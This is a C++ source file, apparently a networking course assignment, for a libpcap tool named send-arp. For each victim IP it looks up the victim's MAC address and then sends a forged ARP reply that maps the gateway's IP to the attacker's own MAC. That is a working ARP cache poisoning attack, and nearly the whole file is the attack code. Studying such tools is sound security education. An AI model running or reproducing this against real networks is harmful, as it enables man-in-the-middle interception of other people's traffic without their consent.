#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include "mac.h"
#include "ip.h"
#include <unistd.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac get_my_mac(const char* interface){
    struct ifreq ifr;
    int fd;
    uint8_t mac_addr[6];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0){
        printf("get_my_mac fail. cannot open socket.\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ); 
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        printf("get_my_mac fail. cannot get mac. please write right interface.\n");
        close(fd);
        exit(0);
    }

    close(fd);
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    return Mac(mac_addr);
}

Ip get_my_ip(const char* interface){
    struct ifreq ifr;
    int fd;
    char ip_addr[40];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0){
        printf("get_my_ip fail. cannot open socket.\n");
        exit(0);
    }
    
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        printf("get_my_ip fail. cannot get ip. please write right interface.\n");
        close(fd);
        exit(0);
    }

    close(fd);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_addr, sizeof(struct sockaddr));
    return Ip(ip_addr);
}

Mac get_victim_mac(pcap_t* handle, Mac atk_mac, Ip atk_ip, Ip vict_ip) {
    EthArpPacket arpRequest; //first, make an arp request

    arpRequest.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    arpRequest.eth_.smac_ = atk_mac;
    arpRequest.eth_.type_ = htons(EthHdr::Arp);

    arpRequest.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpRequest.arp_.pro_ = htons(EthHdr::Ip4);
    arpRequest.arp_.hln_ = Mac::SIZE;
    arpRequest.arp_.pln_ = Ip::SIZE;
    arpRequest.arp_.op_ = htons(ArpHdr::Request);
    
    arpRequest.arp_.smac_ = atk_mac;
    arpRequest.arp_.sip_ = htonl(atk_ip); 
    arpRequest.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpRequest.arp_.tip_ = htonl(vict_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequest), sizeof(EthArpPacket));
    if (res != 0) { //second, send and arp request packet
        printf("get_victim_mac fail. cannot send packet.\n");
        exit(0);
    }

    EthArpPacket *arpReply;
    struct pcap_pkthdr* header;
    const u_char* packet;
    while(true){ //thrid, receive arp response packet
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue; 
        if (res == -1 || res == -2) {
            printf("get_victim_mac fail. pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }
        //last, check whether it is right arp response
        arpReply = (EthArpPacket*) packet;
        if(arpReply->eth_.type_ == htons(EthHdr::Arp))
            if(arpReply->arp_.sip() == vict_ip)
                return arpReply->arp_.smac();
        
        printf("you got wrong arp response. try again please.\n");
        exit(0);
    }

}

void sendarp(pcap_t* handle, Mac atk_mac, Mac vict_mac, Ip vict_ip, Ip gate_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = vict_mac;
    packet.eth_.smac_ = atk_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = atk_mac;
    packet.arp_.sip_ = htonl(Ip(gate_ip));
    packet.arp_.tmac_ = vict_mac;
    packet.arp_.tip_ = htonl(Ip(vict_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        printf("send arp fail. pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2) { //wrong input : argc less than 4 or odd number
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac attacker_mac;
	Ip attacker_ip;

	attacker_mac = get_my_mac(argv[1]);
    printf("Attacker Mac address is %s\n",attacker_mac.operator std::string().c_str());
    attacker_ip = get_my_ip(argv[1]);
	printf("Attacker Ip address is %s\n",attacker_ip.operator std::string().c_str());

    char* victim_ip; //victim = sender
    char* gateway_ip; //gateway = target
    Mac victim_mac;
    for (int i=2; i<argc; i+=2){
        // make Ip by constructor
        Ip victim_ip(argv[i]);
        Ip gateway_ip(argv[i+1]);

        victim_mac = get_victim_mac(handle, attacker_mac, attacker_ip, victim_ip);
        printf("victim Mac address is %s\n",victim_mac.operator std::string().c_str());
        sendarp(handle, attacker_mac, victim_mac, victim_ip, gateway_ip);
    }

    pcap_close(handle);
	return 0;
}
